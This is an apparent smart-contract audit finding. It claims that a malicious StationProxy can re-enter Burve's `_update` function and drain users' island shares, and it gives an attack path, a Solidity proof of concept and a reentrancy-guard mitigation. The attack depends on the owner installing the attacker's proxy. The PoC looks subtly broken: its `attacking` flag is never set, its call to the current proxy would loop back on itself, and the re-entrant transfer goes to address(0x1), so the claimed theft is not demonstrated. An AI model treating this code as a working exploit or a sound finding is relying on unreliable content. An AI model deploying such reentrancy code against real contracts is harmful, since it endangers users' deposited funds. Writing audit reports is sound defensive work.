# Malicious StationProxy will steal funds from Burve users

### Summary

A reentrancy vulnerability in the `_update` function will cause loss of funds for protocol users as an attacker will exploit external calls made before state updates to drain liquidity positions.

### Root Cause

in [Burve.sol 704 - 725](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/single/Burve.sol#L704-L725) the external calls to StationProxy during token transfers are made before state changes are completed.

### Internal Pre-conditions

- A malicious actor needs to deploy a custom StationProxy implementation that performs reentrancy
- The owner needs to call migrateStationProxy() to set the stationProxy address to the malicious implementation
- Users need to have LP tokens and island shares in the protocol

### External Pre-conditions

N/a

### Attack Path

- Attacker deploys a malicious StationProxy that exploits reentrancy during withdrawLP()
- Attacker convinces or tricks owner to migrate to the malicious proxy
- When any user transfers LP tokens, the _update() function is called
- The _update() function calls stationProxy.withdrawLP() with the user's island shares
- The malicious proxy reenters and calls transfer() again before state updates complete
- This creates a recursive loop that can manipulate island share calculations
- The attacker can extract more funds than entitled through repeated withdrawals

### Impact

The users can suffer loss of their deposited funds, potentially the full value of their island shares. The attacker gains these island shares unfairly.

### PoC

```solidity
contract MaliciousProxy is IStationProxy {
    Burve public burveContract;
    address public attacker;
    bool public attacking = false;
    
    constructor(Burve _burve, address _attacker) {
        burveContract = _burve;
        attacker = _attacker;
    }
    
    function withdrawLP(address lp, uint256 amount, address user) external override {
        // Legitimate withdrawal happens
        IStationProxy originalProxy = IStationProxy(burveContract.stationProxy());
        originalProxy.withdrawLP(lp, amount, user);
        
        // Reenter if we're attacking
        if (attacking && msg.sender == address(burveContract)) {
            attacking = false;
            // Transfer a small amount to trigger another withdrawal
            burveContract.transfer(address(0x1), 1);
        }
    }
}

```

### Mitigation

Implement a reentrancy guard in the _update() function or follow the checks-effects-interactions pattern by ensuring all state changes occur before external calls. Use OpenZeppelin's ReentrancyGuard for the implementation.
